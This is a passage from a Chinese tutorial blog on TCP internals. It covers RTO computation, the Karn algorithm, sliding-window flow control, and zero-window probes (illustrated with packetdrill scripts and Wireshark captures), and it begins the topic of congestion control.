<p>先来看第一个计算 SRTT 的公式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SRTT &#x3D; (1 -  α) * SRTT +  α * RTT</span><br></pre></td></tr></table></figure>
<p>这个公式与我们前面介绍的传统方法计算 SRTT 是一样的，都是新样本和旧值不同的比例权重共同构成了新的 SRTT 值，权重因子 α 的建议值是 0.125。在这种情况下， SRTT = 87.5% 的原始值 + 12.5% 的新采样值。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/137.jpg"></p>
<p>第二个公式是计算 RTTVAR：「已平滑的 RTT 平均偏差估计器」（round-trip time variation，RTTVAR）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RTTVAR &#x3D; (1 - β) * RTTVAR + β * (|RTT-SRTT|) </span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/138.jpg"></p>
<p>平均偏差是标准方差的良好近似，计算较为容易，无需标准方差的求平方根运算。如果 β 取建议值 0.25 则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RTTVAR  </span><br><span class="line">&#x3D; 0.75 * RTTVAR + 0.25 * (|RTT-SRTT|)</span><br><span class="line">&#x3D; 75% 的原始值 + 25% 的平滑 SRTT 与最新测量 RTT 的差值</span><br></pre></td></tr></table></figure>
<p>第三个公式计算最终的 RTO 值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RTO &#x3D; µ * SRTT + ∂ * RTTVAR </span><br></pre></td></tr></table></figure>
<p>μ 建议值取 1，∂ 建议值取 4，则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RTO &#x3D; SRTT + 4 * RTTVAR</span><br></pre></td></tr></table></figure>
<p>这种算法下 RTO 与 RTT 变化的差值关系更密切，能对变化剧烈的 RTT做出更及时的调整。</p>
<h3 id="重传二义性与-Karn-Partridge-算法"><a href="#重传二义性与-Karn-Partridge-算法" class="headerlink" title="重传二义性与 Karn / Partridge 算法"></a>重传二义性与 Karn / Partridge 算法</h3><p>前面的算法都很精妙，但是有一个最基本的问题还没解决，如何重传情况下计算 RTT，下面列举了三种常见的场景 </p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/139.jpg"></p>
<p>当客户收到重传过的某个请求的一个应答时，它不能区分该应答对应哪一次请求。</p>
<p>如果用第一次发送数据的时间和收到 ACK 的时间来算 RTT，就会出现图 1 和图 2 中的问题，RTT 时间明显是大于实际值</p>
<p>如果用第二次发送数据的时间和收到 ACK 的时间差值来算 RTT，就会出现图 3 中的问题，RTT 时间明显小于实际值</p>
<p>上面的这种问题，就称为「重传二义性」（retransmission ambiguity problem）</p>
<p>Karn / Partridge 算法就是为了解决重传二义性的。它的思路也是很奇特，解决问题的最好办法就是不解决它：</p>
<pre><code>既然不能确定 ACK 包到底对应重传包还是非重传包，那这次就忽略吧，这次重传的 RTT 不会被用来更新 SRTT 及后面的 RTO
只有当收到未重传过的某个请求的 ACK 包时，才更新 SRTT 等变量并重新计算RTO</code></pre>
<p>仅仅有上面的规则是远远不够的，放弃掉重传那次不管看起来就像遇到危险把头埋在沙子里的鸵鸟。如果网络抖动，倒是突然出现大量重传，但这个时候 RTO 没有更新，就很坑了，本身 RTO 就是为了自适应网络延迟状况的，结果出问题了没有任何反应。这里 Karn 算法采用了出现重传就将 RTO 翻倍的方法，这就是我们前面看到过的<code>指数级退避</code>（Exponential backoff）。这种方式比较粗暴，但是非常简单。</p>
<h3 id="小结-13"><a href="#小结-13" class="headerlink" title="小结"></a>小结</h3><p>这篇文章我们讲了 <code>RTO</code> 的由来和计算 <code>RTO</code> 的经典方法和标准方法的计算方式：</p>
<pre><code>经典方法：适用 RTT 波动较小的情况
标准方法：对 RTT 波动较大的情况下有更好的适应效果</code></pre>
<p>最后的部分引入了「重传二义性」的概念，看到了计算重传情况下 RTT 的困难之处，由此引入了 Karn 算法：</p>
<pre><code>重传情况下不用测量的 RTT 来更新 SRTT 和 RTTVAR
出现重传时 RTO 采用指数级退避的方式，直到后续包出现不需要重传就可以收到确认为止</code></pre>
<h2 id="24-TCP流量控制-——-滑动窗口"><a href="#24-TCP流量控制-——-滑动窗口" class="headerlink" title="24 TCP流量控制 —— 滑动窗口"></a>24 TCP流量控制 —— 滑动窗口</h2><p>这篇文章我们来开始介绍 TCP 的滑动窗口。滑动窗口的一个非常重要的概念，是理解 TCP 精髓的关键，下面来开始这部分的内容吧。</p>
<p>如果从 socket 的角度来看TCP，是下面这样的</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/140.jpg"></p>
<p>TCP 会把要发送的数据放入<code>发送缓冲区</code>（Send Buffer)，接收到的数据放入<code>接收缓冲区</code>（Receive Buffer），应用程序会不停的读取接收缓冲区的内容进行处理。</p>
<p>流量控制做的事情就是，如果接收缓冲区已满，发送端应该停止发送数据。那发送端怎么知道接收端缓冲区是否已满呢？</p>
<p>为了控制发送端的速率，接收端会告知客户端自己<code>接收窗口</code>（rwnd），也就是<code>接收缓冲区中空闲的部分</code>。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/142.jpg"></p>
<p>TCP 在收到数据包回复的 ACK 包里会带上自己接收窗口的大小，发送端需要根据这个值调整自己的发送策略。</p>
<h3 id="发送窗口与接收窗口"><a href="#发送窗口与接收窗口" class="headerlink" title="发送窗口与接收窗口"></a>发送窗口与接收窗口</h3><p>一个非常容易混淆的概念是「发送窗口」和「接收窗口」，很多人会认为接收窗口就是发送窗口。</p>
<p>先来问一个问题，wireshark 抓包中显示的 win=29312 指的是「发送窗口」的大小吗？</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/143.jpg"></p>
<p>当然不是的，其实这里的 win 表示向对方声明自己的接收窗口的大小，对方收到以后，会把自己的「发送窗口」限制在 29312 大小之内。如果自己的处理能力有限，导致自己的接收缓冲区满，接收窗口大小为 0，发送端应该停止发送数据。</p>
<h3 id="TCP-包状态分类"><a href="#TCP-包状态分类" class="headerlink" title="TCP 包状态分类"></a>TCP 包状态分类</h3><p>从 TCP 角度而言，数据包的状态可以分为如下图的四种 </p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/144.jpg"></p>
<p>●粉色部分#1 (Bytes Sent and Acknowledged)：表示已发送且已收到 ACK 确认的数据包。</p>
<p>●蓝色部分#2 (Bytes Sent but Not Yet Acknowledged)：表示已发送但未收到 ACK 的数据包。发送方不确定这部分数据对端有没有收到，如果在一段时间内没有收到 ACK，发送端需要重传这部分数据包。</p>
<p>●绿色部分#3 (Bytes Not Yet Sent for Which Recipient Is Ready)：表示未发送但接收端已经准备就绪可以接收的数据包（有空间可以接收）</p>
<p>●黄色部分#4 (Bytes Not Yet Sent，Not Ready to Receive)：表示还未发送，且这部分接收端没有空间接收</p>
<h3 id="发送窗口（send-window）与可用窗口（usable-window）"><a href="#发送窗口（send-window）与可用窗口（usable-window）" class="headerlink" title="发送窗口（send window）与可用窗口（usable window）"></a>发送窗口（send window）与可用窗口（usable window）</h3><p>发送窗口是 TCP 滑动窗口的核心概念，它表示了在某个时刻一端能拥有的最大未确认的数据包大小（最大在途数据），发送窗口是发送端被允许发送的最大数据包大小，其大小等于上图中 <code>#2 区域</code>和 <code>#3 区域</code>加起来的总大小</p>
<p>窗口的左边界表示成功发送并已经被接收方确认的最大字节序号，窗口的右边界是发送方当前可以发送的最大字节序号，<code>滑动窗口的大小</code>等于<code>右边界减去左边界</code>。</p>
<p>如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/145.jpg"></p>
<p>当上图中的可用区域的6个字节（46~51）发送出去，可用窗口区域减小到 0，这个时候除非收到接收端的 ACK 数据，否则发送端将不能发送数据。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/146.jpg"></p>
<p>我们用 packetdrill 复现上面的现象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">--tolerance_usecs&#x3D;100000</span><br><span class="line">0 socket(..., SOCK_STREAM, IPPROTO_TCP) &#x3D; 3</span><br><span class="line">+0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) &#x3D; 0</span><br><span class="line">&#x2F;&#x2F; 禁用 nagle 算法</span><br><span class="line">+0 setsockopt(3, SOL_TCP, TCP_NODELAY, [1], 4) &#x3D; 0</span><br><span class="line">+0 bind(3, ..., ...) &#x3D; 0</span><br><span class="line">+0 listen(3, 1) &#x3D; 0</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 三次握手</span><br><span class="line">+0  &lt; S 0:0(0) win 20 &lt;mss 1000&gt;</span><br><span class="line">+0  &gt; S. 0:0(0) ack 1 &lt;...&gt;</span><br><span class="line">+.1 &lt; . 1:1(0) ack 1 win 20</span><br><span class="line">+0  accept(3, ..., ...) &#x3D; 4</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 演示已经发送并 ACK 前 31 字节数据</span><br><span class="line">+.1  write(4, ..., 15) &#x3D; 15</span><br><span class="line">+0 &lt; . 1:1(0) ack 16 win 20</span><br><span class="line">+.1  write(4, ..., 16) &#x3D; 16</span><br><span class="line">+0 &lt; . 1:1(0) ack 32 win 20</span><br><span class="line"></span><br><span class="line">+0  write(4, ..., 14) &#x3D; 14</span><br><span class="line">+0  write(4, ..., 6) &#x3D; 6</span><br><span class="line"></span><br><span class="line">+.1 &lt; . 1:1(0) ack 52 win 20</span><br><span class="line"></span><br><span class="line">+0 &#96;sleep 1000000&#96;</span><br></pre></td></tr></table></figure>
<p>解析如下：</p>
<p>●一开始我们禁用了 Nagle 算法以便后面可以连续发送包。</p>
<p>●三次握手以后，客户端声明自己的窗口大小为 20 字节</p>
<p>●通过两次发包和确认前 31 字节的数据</p>
<p>●发送端发送(32,46)部分的 14 字节数据，滑动窗口的可用窗口变为 6</p>
<p>●发送端发送(46,52)部分的 6 字节数据，滑动窗口的可用窗口变为 0，此时发送端不能往接收端发送任何数据了，除非有新的 ACK 到来</p>
<p>●接收端确认(32,52)部分 20 字节的数据，可用窗口重现变为 20</p>
<p>滑动窗口变化过程如下： </p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/147.jpg"></p>
<p>这个过程抓包的结果如下图：</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/148.jpg"></p>
<p>抓包显示的 <code>TCP Window Full</code>不是一个 TCP 的标记，而是 wireshark 智能帮忙分析出来的，表示<code>包的发送方已经把对方所声明的接收窗口耗尽了</code>，三次握手中客户端声明自己的接收窗口大小为 20，这意味着发送端最多只能给它发送 20 个字节的数据而无需确认，<code>在途字节数</code>最多只能为 20 个字节。</p>
<h3 id="TCP-window-full"><a href="#TCP-window-full" class="headerlink" title="TCP window full"></a>TCP window full</h3><p>我们用 packetdrill 再来模拟这种情况：三次握手中接收端告诉自己它的接收窗口为 4000，如果这个时候发送端发送 5000 个字节的数据，会发生什么呢？</p>
<p>是会发送 5000 个字节出去，还是 4000 字节？</p>
<p>脚本内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">--tolerance_usecs&#x3D;100000</span><br><span class="line">0 socket(..., SOCK_STREAM, IPPROTO_TCP) &#x3D; 3</span><br><span class="line">+0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) &#x3D; 0</span><br><span class="line">+0 bind(3, ..., ...) &#x3D; 0</span><br><span class="line">+0 listen(3, 1) &#x3D; 0</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 三次握手告诉客户端告诉服务器自己的接收窗口大小为 4000</span><br><span class="line">+0  &lt; S 0:0(0) win 4000 &lt;mss 1000&gt;</span><br><span class="line">+0  &gt; S. 0:0(0) ack 1 &lt;...&gt;</span><br><span class="line">+.1 &lt; . 1:1(0) ack 1 win 4000</span><br><span class="line">+0  accept(3, ..., ...) &#x3D; 4</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 写客户端写 5000 字节数据</span><br><span class="line">+0  write(4, ..., 5000) &#x3D; 5000</span><br><span class="line"></span><br><span class="line">+0 &#96;sleep 1000000&#96;</span><br></pre></td></tr></table></figure>
<p>抓包结果如下</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/149.jpg"></p>
<p>可以看到，因为 MSS 为 1000，每次发包的大小为 1000，总共发了 4 次以后在途数据包字节数为 4000，再发数据就会超过接收窗口的大小了，于是发送端暂停改了发送，<code>等待在途数据包的确认</code>。</p>
<p>过程如下</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/150.jpg"></p>
<h3 id="TCP-Zero-Window"><a href="#TCP-Zero-Window" class="headerlink" title="TCP Zero Window"></a>TCP Zero Window</h3><p>TCP 包中<code>win=</code>表示接收窗口的大小，表示接收端还有多少缓冲区可以接收数据，当窗口变成 0 时，表示接收端不能暂时不能再接收数据了。 我们来看一个实际的例子，如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/151.jpg"></p>
<p>逐个解释一下</p>
<p>第一步：发送端发送 140 字节给接收端，此时因为 140 字节在途未确认，所以它的可用滑动窗口大小为：360 - 140 = 220</p>
<p>第二步：接收端收到 140 字节以后，将这 140 字节放入TCP 接收区缓冲队列。</p>
<p>正常情况下，接收端<code>处理的速度非常快</code>，这 140 字节会马上被应用层取走并释放这部分缓冲区，同时发送确认包给发送端，这样接收端的窗口大小（RCV.WND)马上可以恢复到 360 字节，发送端收到确认包以后也马上将可用发送滑动窗口恢复到 360 字节。</p>
<p>但是如果因为高负载等原因，导致 TCP 没有立马处理接收到的数据包，收到的 140 字节没能全部被取走，这个时候 TCP 会在返回的 ACK 里携带它建议的<code>接收窗口大小</code>，因为自己的处理能力有限，那就告诉对方下次发少一点数据嘛。假设如上图的场景，收到了 140 字节数据，现在只能从缓冲区队列取走 40 字节，还剩下 100 字节留在缓冲队列中，接收端将接收窗口从原来的 360 减小 100 变为 260。</p>
<p>第三步：发送端接收到 ACK 以后，根据接收端的指示，将自己的发送滑动窗口减小到 260。所有的数据都已经被确认，这时候可用窗口大小也等于 260</p>
<p>第四步：发送端继续发送 180 字节的数据给接收端，可用窗口= 260 - 180 = 80。</p>
<p>第五步：接收端收到 180 字节的数据，因为负载高等原因，没有能取走数据，将接收窗口再降低 180，变为 80，在回复给对端的 ACK 里携带回去。</p>
<p>第六步：发送端收到 ACK 以后，将自己的发送窗口减小到 80，同时可用窗口也变为 80</p>
<p>第七步：发送端继续发送 80 字节数据给接收端，在未确认之前在途字节数为 80，发送端可用窗口变为 0</p>
<p>第八步：接收端收到 80 字节的数据，放入接收区缓冲队列，但是入之前原因，没能取走，滑动窗口进一步减小到 0，在回复的 ACK 里捎带回去</p>
<p>第九步：发送端收到 ACK，根据发送端的指示，将自己的滑动窗口总大小减小为 0</p>
<p>思考一个问题：现在发送端的滑动窗口变为 0 了，经过一段时间接收端从高负载中缓过来，可以处理更多的数据包，如果发送端不知道这个情况，它就会永远傻傻的等待了。于是乎，TCP 又设计了<code>零窗口探测的机制</code>（Zero window probe），用来向接收端探测，你的接收窗口变大了吗？我可以发数据了吗？</p>
<p><code>零窗口探测包</code>其实就是一个 ACK 包，下面根据抓包进行详细介绍</p>
<p>我们用 packetdrill 来完美模拟上述的过程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">--tolerance_usecs&#x3D;100000</span><br><span class="line">0 socket(..., SOCK_STREAM, IPPROTO_TCP) &#x3D; 3</span><br><span class="line">+0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) &#x3D; 0</span><br><span class="line">+0 bind(3, ..., ...) &#x3D; 0</span><br><span class="line">+0 listen(3, 1) &#x3D; 0</span><br><span class="line"></span><br><span class="line">+0  &lt; S 0:0(0) win 4000 &lt;mss 1000&gt;</span><br><span class="line">+0  &gt; S. 0:0(0) ack 1 &lt;...&gt;</span><br><span class="line">&#x2F;&#x2F; 三次握手确定客户端接收窗口大小为 360</span><br><span class="line">+.1 &lt; . 1:1(0) ack 1 win 360</span><br><span class="line">+0  accept(3, ..., ...) &#x3D; 4</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 第一步：往客户端（接收端）写 140 字节数据</span><br><span class="line">+0  write(4, ..., 140) &#x3D; 140</span><br><span class="line">&#x2F;&#x2F; 第二步：模拟客户端回复 ACK，接收端滑动窗口减小为 260</span><br><span class="line">+.01 &lt; . 1:1(0) ack 141 win 260</span><br><span class="line">&#x2F;&#x2F; 第四步：服务端（发送端）接续发送 180 字节数据给客户端（接收端）</span><br><span class="line">+0  write(4, ..., 180) &#x3D; 180</span><br><span class="line">&#x2F;&#x2F; 第五步：模拟客户端回复 ACK，接收端滑动窗口减小到 80</span><br><span class="line">+.01 &lt; . 1:1(0) ack 321 win 80</span><br><span class="line">&#x2F;&#x2F; 第七步：服务端（发送端）继续发送 80 字节给客户端（接收端）</span><br><span class="line">+0  write(4, ..., 80) &#x3D; 80</span><br><span class="line">&#x2F;&#x2F; 第八步：模拟客户端回复 ACK，接收端滑动窗口减小到 0</span><br><span class="line">+.01 &lt; . 1:1(0) ack 401 win 0</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 这一步很重要，写多少数据没关系，一定要有待发送的数据。如果没有待发的数据，不会进行零窗口探测</span><br><span class="line">&#x2F;&#x2F; 这 100 字节数据实际上不会发出去</span><br><span class="line">+0  write(4, ..., 100) &#x3D; 100</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">+0 &#96;sleep 1000000&#96;</span><br></pre></td></tr></table></figure>
<p>抓包结果如下：</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/152.jpg"></p>
<p>可以看到</p>
<p>●No = 8 的包，发送端发送 80 以后，自己已经把接收端声明的接收窗口大小耗尽了，wireshark 帮我们把这种行为识别为了 TCP Window Full。</p>
<p>●No = 9 的包，是接收端回复的 ACK，携带了 win=0，wireshark 帮忙把这个包标记为了 TCP Zero window</p>
<p>●No = 10 ~ 25 的包就是我们前面提到的TCP Zero Window Probe，但是 wireshark 这里识别这个包为了 Keep-Alive，之所以被识别为Keep-Alive 是因为这个包跟 Keep-Alive 包很像。这个包的特点是：<code>一个长度为 0 的 ACK 包，Seq 为当前连接 Seq 最大值减一</code>。因为发出的探测包一直没有得到回应，所以会一直发送端会一直重试。重试的策略跟前面介绍的超时重传的机制一样，时间间隔遵循<code>指数级退避</code>，最大时间间隔为 120s，重试了 16，总共花费了 16 分钟</p>
<h3 id="有等待重试的地方就有攻击的可能"><a href="#有等待重试的地方就有攻击的可能" class="headerlink" title="有等待重试的地方就有攻击的可能"></a>有等待重试的地方就有攻击的可能</h3><p>与之前介绍的 <code>Syn Flood</code> 攻击类似，上面的零窗口探测也会成为攻击的对象。试想一下，一个<code>客户端</code>利用服务器上现有的大文件，向服务器发起下载文件的请求，在接收少量几个字节以后把自己的 window 设置为 0，不再接收文件，服务端就会开始漫长的十几分钟时间的<code>零窗口探测</code>，如果有大量的客户端对服务端执行这种攻击操作，那么服务端资源很快就被消耗殆尽。</p>
<h3 id="TCP-window-full-与-TCP-zero-window"><a href="#TCP-window-full-与-TCP-zero-window" class="headerlink" title="TCP window full 与 TCP zero window"></a>TCP window full 与 TCP zero window</h3><p>这两者都是发送速率控制的手段，</p>
<p>●TCP Window Full 是站在<code>发送端</code>角度说的，表示在途字节数等于对方接收窗口的情况，此时发送端不能再发数据给对方直到发送的数据包得到 ACK。</p>
<p>●TCP zero window 是站在<code>接收端</code>角度来说的，是接收端接收窗口满，告知对方不能再发送数据给自己。</p>
<h3 id="作业题-5"><a href="#作业题-5" class="headerlink" title="作业题"></a>作业题</h3><p>1、关于 TCP 的滑动窗口,下面哪些描述是错误的?(D)</p>
<pre><code>A、发送端不需要传输完整的窗口大小的报文
B、TCP 滑动窗口允许在收到确认之前发送多个数据包
C、重传计时器超时后,发送端还没有收到确认，会重传未被确认的数据
D、发送端不宣告初始窗口大小</code></pre>
<p>2、TCP使用滑动窗口进行流量控制，流量控制实际上是对（A ）的控制。</p>
<pre><code>A、发送方数据流量
B、接收方数据流量
C、发送、接收方数据流量
D、链路上任意两节点间的数据流量</code></pre>
<h2 id="25-有风度的-TCP-——-拥塞控制"><a href="#25-有风度的-TCP-——-拥塞控制" class="headerlink" title="25 有风度的 TCP —— 拥塞控制"></a>25 有风度的 TCP —— 拥塞控制</h2><p>前面的文章介绍了 TCP 利用滑动窗口来做流量控制，但流量控制这种机制确实可以<code>防止发送端向接收端过多的发送数据</code>，但是它只关注了发送端和接收端自身的状况，而没有<code>考虑整个网络的通信状况</code>。于是出现了我们今天要讲的拥塞处理。</p>
<p>拥塞处理主要涉及到下面这几个算法</p>
<pre><code>慢启动（Slow Start）
拥塞避免（Congestion Avoidance）
快速重传（Fast Retransmit）和快速恢复（Fast Recovery）</code></pre>
<p>为了实现上面的算法，TCP 的每条连接都有两个核心状态值：</p>
<pre><code>拥塞窗口（Congestion Window，cwnd）
慢启动阈值（Slow Start Threshold，ssthresh）</code></pre>
<h3 id="拥塞窗口（Congestion-Window，cwnd）"><a href="#拥塞窗口（Congestion-Window，cwnd）" class="headerlink" title="拥塞窗口（Congestion Window，cwnd）"></a>拥塞窗口（Congestion Window，cwnd）</h3><p>拥塞窗口指的是在收到对端 ACK 之前自己还能传输的最大 MSS 段数。</p>
<p>它与前面介绍的接收窗口（rwnd）有什么区别呢？</p>
<p>●接收窗口（rwnd）是<code>接收端</code>的限制，是接收端还能接收的数据量大小</p>
<p>●拥塞窗口（cwnd）是<code>发送端</code>的限制，是发送端在还未收到对端 ACK 之前还能发送的数据量大小</p>
<p>我们在 TCP 头部看到的 window 字段其实讲的<code>接收窗口（rwnd）大小</code>。</p>
<p>拥塞窗口初始值等于操作系统的一个变量 initcwnd，最新的 linux 系统 initcwnd 默认值等于 <code>10</code>。</p>
<p>拥塞窗口与前面介绍的发送窗口（Send Window）又有什么关系呢？</p>
<p>真正的发送窗口大小 = <code>「接收端接收窗口大小」</code> 与 「<code>发送端自己拥塞窗口大小」</code> 两者的<code>最小值</code></p>
<p>如果接收窗口比拥塞窗口小，表示接收端<code>处理能力不够</code>。如果拥塞窗口小于接收窗口，表示接收端处理能力 ok，但<code>网络拥塞</code>。</p>
<p>这也很好理解，发送端能发送多少数据，取决于两个因素</p>
<pre><code>对方能接收多少数据（接收窗口）
自己为了避免网络拥塞主动控制不要发送过多的数据（拥塞窗口）</code></pre>
<p>发送端和接收端不会交换 cwnd 这个值，这个值是维护在发送端本地内存中的一个值，发送端和接收端最大的在途字节数（未经确认的）数据包大小只能是 rwnd 和 cwnd 的最小值。</p>
<p>拥塞控制的算法的本质是控制拥塞窗口（cwnd）的变化。</p>
<h3 id="拥塞处理算法一：慢启动"><a href="#拥塞处理算法一：慢启动" class="headerlink" title="拥塞处理算法一：慢启动"></a>拥塞处理算法一：慢启动</h3><p>在连接建立之初，应该发多少数据给接收端才是合适的呢？</p>
<p>你不知道对端有多快，如果有足够的带宽，你可以选择用最快的速度传输数据，但是如果是一个缓慢的移动网络呢？如果发送的数据过多，只是造成更大的网络延迟。这是基于整个考虑，每个 TCP 连接都有一个拥塞窗口的限制，最初这个值很小，随着时间的推移，每次发送的数据量如果在不丢包的情况下，“慢慢”的递增，这种机制被称为「慢启动」</p>
